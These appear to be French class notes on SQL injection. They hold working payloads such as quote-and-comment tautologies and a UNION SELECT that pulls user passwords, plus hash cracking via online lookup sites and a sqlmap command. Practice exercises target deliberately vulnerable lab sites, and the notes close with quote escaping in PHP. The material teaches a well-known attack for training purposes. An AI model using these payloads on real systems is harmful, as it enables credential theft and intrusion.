# Injection SQL 

j'ai un formulaire de recherche 

=> rechercher un produit va son nom
=> rechercher une catégorie de produit 

=> PS4



=> l'utilisateur va saisir du SQL 

```sql
-- récupérer tous les profils utilisateurs 
SELECT
INSERT
UPDATE
DELETE 

# l'attaquant va utiliser 2 choses essentielles 
    - syntaxe spéciale pour commenter # -- /**/ => ça permet de bloquer la suite de la requête SQL
    - apostrophe ' 
    - guillemet "

=> PS4' #
=> PS4" --


SELECT * FROM table WHERE id = '1' ; 


SELECT * FROM table WHERE id = '1' #' ; 
# le apostrophe ferme le paramètre 1
# le dièse va commenter (bloquer) la fin de la requête


1' OR 1 = 1 #
' OR 1 = 1 #
' OR 1  #


SELECT * FROM table WHERE id = '' OR 1  #' ; 
#                           FALSE OR TRUE
#                   WHERE TRUE 
# SELECT * FROM table => permet d'enlever la clause WHERE 

1' OR 1 = 1 UNION SELECT first_name , password AS last_name FROM users #
' OR 1 UNION SELECT first_name , password AS last_name FROM users #

```

etudiant 
id | nom | lastname | password
1    A      DOE         azerty
2    B      DOE         123456


prof
id | nom | lastname | password
1    c      DUPONT      azerty
3    d      DUFOUR      123456

SELECT nom, lastname FROM etudiant UNION SELECT nom, lastname FROM prof

SELECT nom, lastname FROM etudiant UNION SELECT nom, password FROM etudiant
SELECT nom, lastname FROM etudiant UNION SELECT nom, password AS lastname  FROM etudiant


=> password => e99a18c428cb38d5f260853678922e03 (hash)

=> créer à partir d'un texte => hash empreinte 
=> il n'existe pas de fonction qui permet de faire l'inverse 
md5("azerty")  => e99a18c428cb38d5f260853678922e03

=> rainbow dictionnaire => existe des sites internet qui contiennent une base de données de 

hash 

=> [crackstation](https://crackstation.net/) 

sha1
sha256
sha384

=> <https://www.dcode.fr/hash-sha1>

# cas pratique 

- aller sur le site internet suivant <http://altoro.testfire.net/>
- site codé en Java 
- simule un site bancaire / assurance
- le cas pratique est le suivant : pouvez accéder à l'espace privé du site en tant d'administrateur ??? 
- Astuce => injection SQL 


# cas pratique 2

Dans ce challenge vous devez réussir à vous connecter avec un compte d'un agent immobilier. Le développeur à fait une modification est récupère le password depuis une requête SQL, puis le compare au SHA1 du mot de passe fourni par l'utilisateur.

<https://adc6-176-161-114-130.ngrok-free.app>

nouvelle adresse internet

<https://8015-176-161-114-130.ngrok-free.app>


sqlmap -r 02-burp.txt -p password


SELECT id, email, first_name, last_name, password FROM users WHERE email='a' OR 1 UNION SELECT id, email, first_name, last_name, password FROM users  --

a' OR 1 --

# injection medium

cliquer droit > inspecter > sélectionner la balise <select> la balise du menu déroulant

modifier directement dans le DOM l'attribut value de l'<option>


<option value="1">1</option>

<option value="' OR 1 --">' OR 1 --</option>

Voici la solution : 

<option value="1 OR 1 --">1 OR 1 --</option>

SELECT * FROM table WHERE id = '1'

échappement des paramètres d'une requête SQL 

# Echappement 

- essentiel de comprendre ce concept pour la sécurité 

 
- le symbole apostrophe est un caractère qui a PLUSIEURS sens
- en français : l'école
- en informatique : créer une variable qui stocker du texte

```php
// créer une variable qui s'appelle $prenom
// et cette variable contient la valeur Alain qui est entouré de ''
// chaine de caractères
$prenom = 'Alain2' ;
$prix = '20 euros' ; 

$citation = 'Victor Hugo a dit j\'ai faim ! '; 
$citation = "Victor Hugo a dit j\"ai faim ! "; 

// pour faire comprendre à programme que l'apostrophe entre j et ai est vraiment le caractère qui va lier les deux mots ET ce n'est pas la fin du texte

// on ajoute, juste avant l'apostrophe, le symbole \ pour signifier à PHP que l'apostrophe EST vraiment un caractère de liaison


SELECT * FROM users WHERE id = '1'
SELECT * FROM users WHERE id = '1\''

```

-  
- toto' OR 1 --
- toto\' OR 1 --


```txt
Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'
```

Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'

toto' OR 1 --

1 OR 1 --
1' OR 1 --
1\' OR 1 --